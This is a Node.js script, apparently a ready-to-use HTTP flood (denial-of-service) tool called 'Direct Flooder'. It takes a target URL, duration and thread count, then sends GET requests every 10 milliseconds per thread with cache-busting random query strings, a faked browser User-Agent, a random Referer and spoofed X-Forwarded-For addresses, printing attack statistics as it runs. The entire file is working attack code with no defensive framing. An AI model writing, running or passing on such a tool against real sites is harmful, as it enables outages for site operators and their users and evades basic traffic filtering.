const https = require('https');
const http = require('http');
const urlLib = require('url');
const chalk = require('chalk');

const args = process.argv.slice(2);

const BANNER = `
${chalk.redBright('╔══════════════════════════════════════════════════════╗')}
${chalk.redBright('║')}            ${chalk.bold.yellow('Direct Flooder by Naruto <3')}               ${chalk.redBright('║')}
${chalk.redBright('║')}           ${chalk.gray('No cookies, pure raw HTTP power')}             ${chalk.redBright('║')}
${chalk.redBright('╚══════════════════════════════════════════════════════╝')}
`;

if (args.length < 2) {
  console.log(BANNER);
  console.log(chalk.cyanBright('[Usage] ') + `node DirectFlooder.js <url> <time> [threads]`);
  process.exit(1);
}

const targetUrl = args[0];
const time = Number(args[1]);
const threads = Number(args[2]) || 10;

const parsedUrl = urlLib.parse(targetUrl);

const rStr = (l) => {
  const a = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let s = '';
  for (let i = 0; i < l; i++) s += a[Math.floor(Math.random() * a.length)];
  return s;
};

const rIp = () => {
  const r = () => Math.floor(Math.random() * 255);
  return `${r()}.${r()}.${r()}.${r()}`;
};

let requests = 0;
let errors = 0;

console.log(BANNER);
console.log(chalk.magentaBright('[🔥] Starting direct flood...'));
console.log(chalk.yellowBright(`  • Target: ${targetUrl}`));
console.log(chalk.yellowBright(`  • Duration: ${time} seconds`));
console.log(chalk.yellowBright(`  • Threads: ${threads}\n`));

const attack = () => {
  const options = {
    hostname: parsedUrl.hostname,
    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
    path: parsedUrl.path + '?' + rStr(8),
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Referer': `https://google.com/${rStr(10)}`,
      'X-Forwarded-For': rIp()
    },
  };

  const req = (parsedUrl.protocol === 'https:' ? https : http).request(options, (res) => {
    res.on('data', () => { }); 
    requests++;
  });

  req.on('error', () => {
    errors++;
  });

  req.end();
};

const intervals = [];
for (let i = 0; i < threads; i++) {
  intervals.push(setInterval(attack, 10));
}

const status = setInterval(() => {
  process.stdout.write(
    chalk.blueBright(`\r[📊 STATS] Sent: ${requests} | Errors: ${errors} | Threads: ${threads} `)
  );
}, 1000);

setTimeout(() => {
  intervals.forEach(clearInterval);
  clearInterval(status);
  console.log(chalk.redBright('\n\n--- Attack Complete ---'));
  console.log(chalk.greenBright(`✔ Total Sent: ${requests}`));
  console.log(chalk.redBright(`✘ Total Errors: ${errors}`));
  process.exit(0);
}, time * 1000);
